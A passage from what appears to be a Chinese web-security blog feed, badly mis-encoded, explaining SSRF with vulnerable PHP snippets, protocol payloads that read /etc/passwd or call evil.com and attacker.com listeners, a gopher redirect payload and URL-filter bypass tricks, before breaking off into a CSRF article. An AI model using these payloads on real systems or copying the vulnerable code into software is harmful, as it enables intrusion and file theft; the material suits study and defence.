‡åœ°å€åšè¿‡æ»¤å’Œé™åˆ¶ã€‚ ä¾‹å¦‚ï¼Œé»‘å®¢æ“ä½œæœåŠ¡ç«¯ä»æŒ‡å®šURLåœ°å€è·å–ç½‘é¡µæ–‡æœ¬å†…å®¹ï¼ŒåŠ è½½æŒ‡å®šåœ°å€çš„å›¾ç‰‡ï¼Œä¸‹è½½ç­‰ï¼Œåˆ©ç”¨çš„å°±æ˜¯æœåŠ¡ç«¯è¯·æ±‚ä¼ªé€ ï¼ŒSSRFåˆ©ç”¨å­˜åœ¨ç¼ºé™·çš„WEBåº”ç”¨ä½œä¸ºä»£ç† æ”»å‡»è¿œç¨‹ å’Œ æœ¬åœ°çš„æœåŠ¡å™¨ã€‚</p><h2 id="æ¼æ´åŸç†"><a href="#æ¼æ´åŸç†" class="headerlink" title="æ¼æ´åŸç†"></a>æ¼æ´åŸç†</h2><ul><li>æ”»å‡»è€…å¯ä»¥é€šè¿‡å…¬ç½‘è®¿é—®åˆ°æŸä¸ªwebæœåŠ¡å™¨ï¼›</li><li>ä½†æ˜¯æ”»å‡»è€…æ˜¯æ— æ³•é€šè¿‡å…¬ç½‘è®¿é—®åˆ°å†…ç½‘çš„å…¶ä»–è®¾å¤‡æˆ–è€…åŠå…¬åŒºåŸŸï¼›</li><li>è¿™æ—¶å€™å¦‚æœæƒ³è¿›è¡Œå†…ç½‘æ¢æµ‹ï¼ŒwebæœåŠ¡å™¨åŒæ—¶å­˜åœ¨SSRFæ¼æ´ï¼Œå°±èƒ½ä»¥webæœåŠ¡å™¨ä½œä¸ºè·³æ¿ï¼Œè¿›è€Œæ”»å‡»å…¶ä»–æœåŠ¡å™¨æˆ–åŒºåŸŸã€‚</li></ul><p><img src="/img/SSRF/ssrf.png" alt=""></p><h2 id="æ¼æ´äº§ç”Ÿä¸å±å®³"><a href="#æ¼æ´äº§ç”Ÿä¸å±å®³" class="headerlink" title="æ¼æ´äº§ç”Ÿä¸å±å®³"></a>æ¼æ´äº§ç”Ÿä¸å±å®³</h2><p>åœ¨PHPä¸­çš„<code>curl()ï¼Œfile_get_contents()ï¼Œfsockopen()</code>ç­‰å‡½æ•°æ˜¯å‡ ä¸ªä¸»è¦äº§ç”Ÿssrfæ¼æ´çš„å‡½æ•°</p><p><strong>file_get_contents()</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//file_get_contentsæ˜¯æŠŠæ–‡ä»¶å†™å…¥å­—ç¬¦ä¸²ï¼Œå½“æŠŠurlæ˜¯å†…ç½‘æ–‡ä»¶çš„æ—¶å€™ï¼Œä¼šå…ˆå»æŠŠè¿™ä¸ªæ–‡ä»¶çš„å†…å®¹è¯»å‡ºæ¥å†å†™å…¥ï¼Œå¯¼è‡´äº†æ–‡ä»¶è¯»å–</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$content</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line">    <span class="variable">$filename</span>=<span class="string">&#x27;./images/&#x27;</span>.<span class="title function_ invoke__">rand</span>().<span class="string">&#x27;.img&#x27;</span>;\</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>,<span class="variable">$content</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">    <span class="variable">$img</span>=<span class="string">&quot;&lt;img src=\&quot;&quot;</span>.<span class="variable">$filename</span>.<span class="string">&quot;\&quot;/&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$img</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>fsockopen()</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//fsockopen()å‡½æ•°æœ¬èº«å°±æ˜¯æ‰“å¼€ä¸€ä¸ªç½‘ç»œè¿æ¥æˆ–è€…Unixå¥—æ¥å­—è¿æ¥</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$host</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$fp</span> = <span class="title function_ invoke__">fsockopen</span>(<span class="string">&quot;<span class="subst">$host</span>&quot;</span>, <span class="number">80</span>, <span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="number">30</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$fp</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$errstr</span> (<span class="subst">$errno</span>)&lt;br /&gt;\n&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$out</span> = <span class="string">&quot;GET / HTTP/1.1\r\n&quot;</span>;</span><br><span class="line">    <span class="variable">$out</span> .= <span class="string">&quot;Host: <span class="subst">$host</span>\r\n&quot;</span>;</span><br><span class="line">    <span class="variable">$out</span> .= <span class="string">&quot;Connection: Close\r\n\r\n&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>, <span class="variable">$out</span>);</span><br><span class="line">    <span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$fp</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">fgets</span>(<span class="variable">$fp</span>, <span class="number">128</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>curl()</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//åˆ©ç”¨æ–¹å¼å¾ˆå¤šæœ€å¸¸è§çš„æ˜¯é€šè¿‡fileã€dictã€gopherè¿™ä¸‰ä¸ªåè®®æ¥è¿›è¡Œæ¸—é€ï¼Œæ¥ä¸‹æ¥ä¹Ÿä¸»è¦æ˜¯é›†ä¸­è®²å¯¹äºcurl()å‡½æ•°çš„åˆ©ç”¨æ–¹å¼</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">curl</span>(<span class="params"><span class="variable">$url</span></span>)</span>&#123;  </span><br><span class="line">    <span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>(); <span class="comment">//  åˆå§‹åŒ–curlè¿æ¥å¥æŸ„</span></span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>); <span class="comment">//è®¾ç½®è¿æ¥URL</span></span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);  <span class="comment">// ä¸è¾“å‡ºå¤´æ–‡ä»¶çš„ä¿¡æ¯</span></span><br><span class="line">    <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);   <span class="comment">// æ‰§è¡Œè·å–ç»“æœ</span></span><br><span class="line">    <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);  <span class="comment">// å…³é—­curlè¿æ¥å¥æŸ„</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">curl</span>(<span class="variable">$url</span>); </span><br></pre></td></tr></table></figure><p>SSRFå¯ä»¥å¯¹å¤–ç½‘ã€æœåŠ¡å™¨æ‰€åœ¨å†…ç½‘ã€æœ¬åœ°è¿›è¡Œç«¯å£æ‰«æï¼Œæ”»å‡»è¿è¡Œåœ¨å†…ç½‘æˆ–æœ¬åœ°çš„åº”ç”¨ï¼Œæˆ–è€…åˆ©ç”¨Fileåè®®è¯»å–æœ¬åœ°æ–‡ä»¶</p><p>å†…ç½‘æœåŠ¡é˜²å¾¡ç›¸å¯¹å¤–ç½‘æœåŠ¡æ¥è¯´ä¸€èˆ¬ä¼šè¾ƒå¼±ï¼Œç”šè‡³éƒ¨åˆ†å†…ç½‘æœåŠ¡ä¸ºäº†è¿ç»´æ–¹ä¾¿å¹¶æ²¡æœ‰å¯¹å†…ç½‘çš„è®¿é—®è®¾ç½®æƒé™éªŒè¯ï¼Œæ‰€ä»¥å­˜åœ¨SSRFæ—¶ï¼Œé€šå¸¸ä¼šé€ æˆè¾ƒå¤§çš„å±å®³</p><h2 id="æ¼æ´æ”»å‡»æ–¹å¼"><a href="#æ¼æ´æ”»å‡»æ–¹å¼" class="headerlink" title="æ¼æ´æ”»å‡»æ–¹å¼"></a>æ¼æ´æ”»å‡»æ–¹å¼</h2><ul><li>å¯¹å¤–ç½‘ï¼ŒæœåŠ¡å™¨æ‰€åœ¨å†…ç½‘ï¼Œæœ¬åœ°è¿›è¡Œç«¯å£æ‰«æï¼ˆæŒ¨ä¸ªè¯•æ¢ï¼‰ï¼Œè·å–ä¸€äº›æœåŠ¡çš„bannerä¿¡æ¯</li><li>æ”»å‡»è¿è¡Œåœ¨å†…ç½‘æˆ–æœ¬åœ°çš„åº”ç”¨ç¨‹åº</li><li>å¯¹å†…ç½‘Webåº”ç”¨è¿›è¡ŒæŒ‡çº¹è¯†åˆ«ï¼Œè¯†åˆ«ä¼ä¸šå†…éƒ¨çš„èµ„äº§ä¿¡æ¯ï¼Œé€šè¿‡è®¿é—®é»˜è®¤æ–‡ä»¶å®ç°(å¦‚ï¼šreadmeæ–‡ä»¶)</li><li>æ”»å‡»å†…å¤–ç½‘çš„Webåº”ç”¨ï¼Œä¸»è¦æ˜¯ä½¿ç”¨HTTP GETè¯·æ±‚å°±å¯ä»¥å®ç°çš„æ”»å‡»(æ¯”å¦‚strust2,SQliç­‰)</li><li>ä¸‹è½½å†…ç½‘èµ„æºï¼Œåˆ©ç”¨fileåè®®è¯»å–æœ¬åœ°æ–‡ä»¶æˆ–èµ„æºç­‰</li><li>å†…éƒ¨ä»»æ„ä¸»æœºçš„ä»»æ„ç«¯å£å‘é€ç²¾å¿ƒæ„é€ çš„Payload</li><li>DOSæ”»å‡»ï¼ˆè¯·æ±‚å¤§æ–‡ä»¶ï¼Œå§‹ç»ˆä¿æŒè¿æ¥Keep-Alive Alwaysï¼‰</li><li>è¿›è¡Œè·³æ¿</li><li>åˆ©ç”¨Redisæœªæˆæƒè®¿é—®ï¼ŒHTTP CRLFæ³¨å…¥å®ç°getshell</li></ul><h1 id="å¯ä»¥åˆ©ç”¨çš„åè®®"><a href="#å¯ä»¥åˆ©ç”¨çš„åè®®" class="headerlink" title="å¯ä»¥åˆ©ç”¨çš„åè®®"></a>å¯ä»¥åˆ©ç”¨çš„åè®®</h1><p><strong>å¸¸ç”¨URLä¼ªåè®®</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">file:<span class="comment">/// ä»æ–‡ä»¶ç³»ç»Ÿä¸­è·å–æ–‡ä»¶å†…å®¹ï¼Œå¦‚ï¼Œfile:///etc/passwd</span></span><br><span class="line">dict:<span class="comment">// å­—å…¸æœåŠ¡å™¨åè®®ï¼Œè®¿é—®å­—å…¸èµ„æºï¼Œå¦‚ï¼Œdict:///ip:6739/infoï¼š</span></span><br><span class="line">sftp:<span class="comment">// SSHæ–‡ä»¶ä¼ è¾“åè®®æˆ–å®‰å…¨æ–‡ä»¶ä¼ è¾“åè®®</span></span><br><span class="line">ldap:<span class="comment">// è½»é‡çº§ç›®å½•è®¿é—®åè®®</span></span><br><span class="line">tftp:<span class="comment">// ç®€å•æ–‡ä»¶ä¼ è¾“åè®®</span></span><br><span class="line">gopher:<span class="comment">// åˆ†å¸ƒå¼æ–‡æ¡£ä¼ é€’æœåŠ¡ï¼Œå¯ä½¿ç”¨gopherusç”Ÿæˆpayload</span></span><br></pre></td></tr></table></figure><h2 id="file"><a href="#file" class="headerlink" title="file"></a>file</h2><p>è¿™ç§URL Schemaå¯ä»¥å°è¯•ä»æ–‡ä»¶ç³»ç»Ÿä¸­è·å–æ–‡ä»¶ï¼š</p><blockquote><p><code>http://example.com/ssrf.php?url=file:///etc/passwd</code></p><p><code>http://example.com/ssrf.php?url=file:///C:/Windows/win.ini</code></p></blockquote><h2 id="dict"><a href="#dict" class="headerlink" title="dict"></a>dict</h2><p>è¿™ç§URL Schemeèƒ½å¤Ÿå¼•ç”¨å…è®¸é€šè¿‡DICTåè®®ä½¿ç”¨çš„å®šä¹‰æˆ–å•è¯åˆ—è¡¨</p><blockquote><p><code>http://example.com/ssrf.php?dict://evil.com:1337/</code></p><p>evil.com:$ nc -lvp 1337<br>Connection from [192.168.0.12] port 1337[tcp/*]<br>accepted (family 2, sport 31126)CLIENT libcurl 7.40.0</p></blockquote><h2 id="sftp"><a href="#sftp" class="headerlink" title="sftp"></a>sftp</h2><p>åœ¨è¿™é‡Œï¼ŒSftpä»£è¡¨SSHæ–‡ä»¶ä¼ è¾“åè®®ï¼ˆSSH File Transfer Protocolï¼‰ï¼Œæˆ–å®‰å…¨æ–‡ä»¶ä¼ è¾“åè®®ï¼ˆSecure File Transfer Protocolï¼‰ï¼Œè¿™æ˜¯ä¸€ç§ä¸SSHæ‰“åŒ…åœ¨ä¸€èµ·çš„å•ç‹¬åè®®ï¼Œå®ƒè¿è¡Œåœ¨å®‰å…¨è¿æ¥ä¸Šï¼Œå¹¶ä»¥ç±»ä¼¼çš„æ–¹å¼è¿›è¡Œå·¥ä½œ</p><blockquote><p><code>http://example.com/ssrf.php?url=sftp://evil.com:1337/</code></p><p>evil.com:$ nc -lvp 1337<br>Connection from [192.168.0.12] port 1337[tcp/*]<br>accepted (family 2, sport 37146)SSH-2.0-libssh2_1.4.2</p></blockquote><h2 id="ldap-æˆ–ldaps-æˆ–ldapi"><a href="#ldap-æˆ–ldaps-æˆ–ldapi" class="headerlink" title="ldap://æˆ–ldaps:// æˆ–ldapi://"></a>ldap://æˆ–ldaps:// æˆ–ldapi://</h2><p>LDAPä»£è¡¨è½»é‡çº§ç›®å½•è®¿é—®åè®®ã€‚å®ƒæ˜¯IPç½‘ç»œä¸Šçš„ä¸€ç§ç”¨äºç®¡ç†å’Œè®¿é—®åˆ†å¸ƒå¼ç›®å½•ä¿¡æ¯æœåŠ¡çš„åº”ç”¨ç¨‹åºåè®®</p><blockquote><p><code>http://example.com/ssrf.php?url=ldap://localhost:1337/%0astats%0aquit</code></p><p><code>http://example.com/ssrf.php?url=ldaps://localhost:1337/%0astats%0aquit</code></p><p><code>http://example.com/ssrf.php?url=ldapi://localhost:1337/%0astats%0aquit</code></p></blockquote><h2 id="tftp"><a href="#tftp" class="headerlink" title="tftp://"></a>tftp://</h2><p>TFTPï¼ˆTrivial File Transfer Protocol,ç®€å•æ–‡ä»¶ä¼ è¾“åè®®ï¼‰æ˜¯ä¸€ç§ç®€å•çš„åŸºäºlockstepæœºåˆ¶çš„æ–‡ä»¶ä¼ è¾“åè®®ï¼Œå®ƒå…è®¸å®¢æˆ·ç«¯ä»è¿œç¨‹ä¸»æœºè·å–æ–‡ä»¶æˆ–å°†æ–‡ä»¶ä¸Šä¼ è‡³è¿œç¨‹ä¸»æœº</p><blockquote><p><code>http://example.com/ssrf.php?url=tftp://evil.com:1337/TESTUDPPACKET</code></p><p>evil.com:# nc -lvup 1337<br>Listening on [0.0.0.0] (family 0, port1337)TESTUDPPACKEToctettsize0blksize512timeout3</p></blockquote><h2 id="gopher"><a href="#gopher" class="headerlink" title="gopher://"></a>gopher://</h2><p>Gopheræ˜¯ä¸€ç§åˆ†å¸ƒå¼æ–‡æ¡£ä¼ é€’æœåŠ¡ã€‚åˆ©ç”¨è¯¥æœåŠ¡ï¼Œç”¨æˆ·å¯ä»¥æ— ç¼åœ°æµè§ˆã€æœç´¢å’Œæ£€ç´¢é©»ç•™åœ¨ä¸åŒä½ç½®çš„ä¿¡æ¯</p><blockquote><p><a href="http://example.com/ssrf.php?url=http://attacker.com/gopher.php">http://example.com/ssrf.php?url=http://attacker.com/gopher.php</a> </p><p><code>gopher.php (host it on acttacker.com):-&lt;?php header(&#39;Location: gopher://evil.com:1337/_Hi%0Assrf%0Atest&#39;);?&gt;</code></p><p>evil.com:# nc -lvp 1337<br>Listening on [0.0.0.0] (family 0, port1337)Connection from [192.168.0.12] port 1337[tcp/*] accepted (family 2, sport 49398)Hissrftest</p></blockquote><h1 id="SSRFæ¼æ´åˆ©ç”¨ï¼ˆå±å®³ï¼‰"><a href="#SSRFæ¼æ´åˆ©ç”¨ï¼ˆå±å®³ï¼‰" class="headerlink" title="SSRFæ¼æ´åˆ©ç”¨ï¼ˆå±å®³ï¼‰"></a>SSRFæ¼æ´åˆ©ç”¨ï¼ˆå±å®³ï¼‰</h1><p>1.å¯ä»¥å¯¹å¤–ç½‘ã€æœåŠ¡å™¨æ‰€åœ¨å†…ç½‘ã€æœ¬åœ°è¿›è¡Œç«¯å£æ‰«æï¼Œè·å–ä¸€äº›æœåŠ¡çš„bannerä¿¡æ¯;</p><p>2.æ”»å‡»è¿è¡Œåœ¨å†…ç½‘æˆ–æœ¬åœ°çš„åº”ç”¨ç¨‹åºï¼ˆæ¯”å¦‚æº¢å‡ºï¼‰;</p><p>3.å¯¹å†…ç½‘webåº”ç”¨è¿›è¡ŒæŒ‡çº¹è¯†åˆ«ï¼Œé€šè¿‡è®¿é—®é»˜è®¤æ–‡ä»¶å®ç°;</p><p>4.æ”»å‡»å†…å¤–ç½‘çš„webåº”ç”¨ï¼Œä¸»è¦æ˜¯ä½¿ç”¨getå‚æ•°å°±å¯ä»¥å®ç°çš„æ”»å‡»ï¼ˆæ¯”å¦‚struts2ï¼Œsqliç­‰ï¼‰;</p><p>5.åˆ©ç”¨fileåè®®è¯»å–æœ¬åœ°æ–‡ä»¶ç­‰ã€‚.</p><p>6.å„ä¸ªåè®®è°ƒç”¨æ¢é’ˆï¼šhttp,file,dict,ftp,gopherç­‰</p><blockquote><p>http:192.168.64.144/phpmyadmin/<br>file:///D:/www.txt<br>dict://192.168.64.144:3306/info<br>ftp://192.168.64.144:21</p></blockquote><h1 id="SSRFç»•è¿‡æ–¹å¼"><a href="#SSRFç»•è¿‡æ–¹å¼" class="headerlink" title="SSRFç»•è¿‡æ–¹å¼"></a>SSRFç»•è¿‡æ–¹å¼</h1><h2 id="å¸¸è§çš„ç»•è¿‡æ–¹å¼"><a href="#å¸¸è§çš„ç»•è¿‡æ–¹å¼" class="headerlink" title="å¸¸è§çš„ç»•è¿‡æ–¹å¼"></a>å¸¸è§çš„ç»•è¿‡æ–¹å¼</h2><p><strong>é™åˆ¶ä¸º<code>http://www.xxx.com</code> åŸŸåæ—¶ï¼ˆåˆ©ç”¨@ï¼‰</strong></p><blockquote><p>å¯ä»¥å°è¯•é‡‡ç”¨httpåŸºæœ¬èº«ä»½è®¤è¯çš„æ–¹å¼ç»•è¿‡<br>å¦‚ï¼š<code>http://www.aaa.com@www.bbb.com@www.ccc.com</code>ï¼Œåœ¨å¯¹@è§£æåŸŸåä¸­ï¼Œä¸åŒçš„å¤„ç†å‡½æ•°å­˜åœ¨å¤„ç†å·®å¼‚<br>åœ¨PHPçš„parse_urlä¸­ä¼šè¯†åˆ«<code>www.ccc.com</code>ï¼Œè€Œlibcurlåˆ™è¯†åˆ«ä¸º<code>www.bbb.com</code>ã€‚</p></blockquote><p><strong>é‡‡ç”¨çŸ­ç½‘å€ç»•è¿‡</strong></p><blockquote><p>æ¯”å¦‚ç™¾åº¦çŸ­åœ°å€<code>https://dwz.cn/</code></p></blockquote><p><strong>é‡‡ç”¨è¿›åˆ¶è½¬æ¢</strong></p><blockquote><p>127.0.0.1</p><p>å…«è¿›åˆ¶ï¼š0177.0.0.1</p><p>åå…­è¿›åˆ¶ï¼š0x7f.0.0.1</p><p>åè¿›åˆ¶ï¼š2130706433.</p></blockquote><p><strong>åˆ©ç”¨ç‰¹æ®ŠåŸŸå</strong></p><blockquote><p>åŸç†æ˜¯DNSè§£æã€‚<strong>xip.io</strong>å¯ä»¥æŒ‡å‘ä»»æ„åŸŸåï¼Œå³<br>127.0.0.1.xip.ioï¼Œå¯è§£æä¸º127.0.0.1<br>(xip.io ç°åœ¨å¥½åƒç”¨ä¸äº†äº†ï¼Œå¯ä»¥æ‰¾æ‰¾å…¶ä»–çš„)</p></blockquote><p><strong>åˆ©ç”¨[::]</strong></p><blockquote><p>å¯ä»¥åˆ©ç”¨[::]æ¥ç»•è¿‡localhost<br><code>http://127.0.0.1</code>&gt;&gt;<a href="http://[::127.0.0.1">http://[::127.0.0.1</a>]</p></blockquote><p><strong>åˆ©ç”¨å¥å·</strong></p><blockquote><p>127ã€‚0ã€‚0ã€‚1 &gt;&gt;&gt; 127.0.0.1</p></blockquote><p><strong>CRLF ç¼–ç ç»•è¿‡</strong></p><blockquote><p>%0d-&gt;0x0d-&gt;\rå›è½¦<br>%0a-&gt;0x0a-&gt;\næ¢è¡Œ<br>è¿›è¡ŒHTTPå¤´éƒ¨æ³¨å…¥</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">example.com/?url=http://eval.com%0d%0aHOST:fuzz.com%0d%0a </span><br></pre></td></tr></table></figure><p><strong>åˆ©ç”¨å°é—­çš„å­—æ¯æ•°å­—</strong></p><blockquote><p>åˆ©ç”¨Enclosed alphanumerics<br>â“”â“§â“â“œâ“Ÿâ“›â“”.â“’â“â“œ &gt;&gt;&gt; example.com<br><code>http://127.0.0.1</code>&gt;&gt;&gt;<a href="http://[::â‘ â‘¡â‘¦ï½¡â“ªï½¡â“ªï½¡â‘ ">http://[::â‘ â‘¡â‘¦ï½¡â“ªï½¡â“ªï½¡â‘ </a>]<br>List:<br>â‘  â‘¡ â‘¢ â‘£ â‘¤ â‘¥ â‘¦ â‘§ â‘¨ â‘© â‘ª â‘« â‘¬ â‘­ â‘® â‘¯ â‘° â‘± â‘² â‘³<br>â‘´ â‘µ â‘¶ â‘· â‘¸ â‘¹ â‘º â‘» â‘¼ â‘½ â‘¾ â‘¿ â’€ â’ â’‚ â’ƒ â’„ â’… â’† â’‡<br>â’ˆ â’‰ â’Š â’‹ â’Œ â’ â’ â’ â’ â’‘ â’’ â’“ â’” â’• â’– â’— â’˜ â’™ â’š â’›<br>â’œ â’ â’ â’Ÿ â’  â’¡ â’¢ â’£ â’¤ â’¥ â’¦ â’§ â’¨ â’© â’ª â’« â’¬ â’­ â’® â’¯ â’° â’± â’² â’³ â’´ â’µ<br>â’¶ â’· â’¸ â’¹ â’º â’» â’¼ â’½ â’¾ â’¿ â“€ â“ â“‚ â“ƒ â“„ â“… â“† â“‡ â“ˆ â“‰ â“Š â“‹ â“Œ â“ â“ â“<br>â“ â“‘ â“’ â““ â“” â“• â“– â“— â“˜ â“™ â“š â“› â“œ â“ â“ â“Ÿ â“  â“¡ â“¢ â“£ â“¤ â“¥ â“¦ â“§ â“¨ â“©<br>â“ª â“« â“¬ â“­ â“® â“¯ â“° â“± â“² â“³ â“´<br>â“µ â“¶ â“· â“¸ â“¹ â“º â“» â“¼ â“½ â“¾ â“¿</p></blockquote><h2 id="å¸¸è§é™åˆ¶"><a href="#å¸¸è§é™åˆ¶" class="headerlink" title="å¸¸è§é™åˆ¶"></a>å¸¸è§é™åˆ¶</h2><p>é™åˆ¶ä¸º<code>http://www.xxx.com</code> åŸŸå</p><blockquote><p>é‡‡ç”¨httpåŸºæœ¬èº«ä»½è®¤è¯çš„æ–¹å¼ç»•è¿‡ï¼Œå³@<br><code>http://www.xxx.com@www.xxc.com</code></p></blockquote><p>é™åˆ¶è¯·æ±‚IPä¸ä¸ºå†…ç½‘åœ°å€</p><blockquote><p>å½“ä¸å…è®¸ipä¸ºå†…ç½‘åœ°å€æ—¶ï¼š<br>ï¼ˆ1ï¼‰é‡‡å–çŸ­ç½‘å€ç»•è¿‡<br>ï¼ˆ2ï¼‰é‡‡å–ç‰¹æ®ŠåŸŸå<br>ï¼ˆ3ï¼‰é‡‡å–è¿›åˆ¶è½¬æ¢</p></blockquote><p>é™åˆ¶è¯·æ±‚åªä¸ºhttpåè®®</p><blockquote><p>ï¼ˆ1ï¼‰é‡‡å–302è·³è½¬<br>ï¼ˆ2ï¼‰é‡‡å–çŸ­åœ°å€</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> webå®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SSRF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSRF</title>
      <link href="/2023/08/05/CSRF/"/>
      <url>/2023/08/05/CSRF/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1 id="æ¦‚è¿°"><a href="#æ¦‚è¿°" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h1><blockquote><p> CSRF (Cross-site request forgeryï¼Œè·¨ç«™è¯·æ±‚ä¼ªé€ )ä¹Ÿè¢«ç§°ä¸ºOne Click Attackæˆ–è€…Session Ridingï¼Œé€šå¸¸ç¼©å†™ä¸ºCSRFæˆ–è€…XSRFï¼Œæ˜¯ä¸€ç§å¯¹ç½‘ç«™çš„æ¶æ„åˆ©ç”¨ã€‚å°½ç®¡å¬èµ·æ¥åƒè·¨ç«™è„šæœ¬(XSS)ï¼Œä½†å®ƒä¸XSSéå¸¸ä¸åŒï¼ŒXSSåˆ©ç”¨ç«™ç‚¹å†…çš„ä¿¡ä»»ç”¨æˆ·ï¼Œè€ŒCSRFåˆ™é€šè¿‡ä¼ªè£…æˆå—ä¿¡ä»»ç”¨æˆ·è¯·æ±‚å—ä¿¡ä»»çš„ç½‘ç«™</p></blockquote><p>ç®€å•çš„è¯´ï¼Œæ˜¯æ”»å‡»è€…é€šè¿‡ä¸€äº›æŠ€æœ¯æ‰‹æ®µæ¬ºéª—ç”¨æˆ·çš„æµè§ˆå™¨å»è®¿é—®ä¸€ä¸ªè‡ªå·±ä»¥å‰è®¤è¯è¿‡çš„ç«™ç‚¹å¹¶è¿è¡Œä¸€äº›æ“ä½œï¼ˆå¦‚å‘é‚®ä»¶ï¼Œå‘æ¶ˆæ¯ï¼Œç”šè‡³è´¢äº§æ“ä½œï¼ˆå¦‚è½¬è´¦å’Œè´­ä¹°å•†å“ï¼‰ï¼‰ã€‚å› ä¸ºæµè§ˆå™¨ä¹‹å‰è®¤è¯è¿‡ï¼Œæ‰€ä»¥è¢«è®¿é—®çš„ç«™ç‚¹ä¼šè§‰å¾—è¿™æ˜¯çœŸæ­£çš„ç”¨æˆ·æ“ä½œè€Œå»è¿è¡Œ</p><h1 id="CSRFæ”»å‡»åŸç†åŠè¿‡ç¨‹"><a href="#CSRFæ”»å‡»åŸç†åŠè¿‡ç¨‹" class="headerlink" title="CSRFæ”»å‡»åŸç†åŠè¿‡ç¨‹"></a>CSRFæ”»å‡»åŸç†åŠè¿‡ç¨‹</h1><p><img src="/img/CSRF/csrf.jpg" alt=""></p><p>1ã€Tomç™»å½•æŸé“¶è¡Œç½‘ç«™ï¼Œäºæ˜¯æµè§ˆå™¨ç”Ÿæˆäº†Tomåœ¨è¯¥é“¶è¡Œçš„çš„èº«ä»½éªŒè¯ä¿¡æ¯ã€‚</p><p>2ã€Jerryåˆ©ç”¨Sns.comæœåŠ¡å™¨å°†ä¼ªé€ çš„è½¬è´¦è¯·æ±‚åŒ…å«åœ¨å¸–å­ä¸­ï¼Œå¹¶æŠŠå¸–å­é“¾æ¥å‘ç»™äº†Tomã€‚</p><p>3ã€Tomåœ¨é“¶è¡Œç½‘ç«™ä¿æŒç™»å½•çš„æƒ…å†µä¸‹æµè§ˆå¸–å­</p><p>4ã€è¿™æ—¶Tomå°±åœ¨ä¸çŸ¥æƒ…çš„æƒ…å†µä¸‹å°†ä¼ªé€ 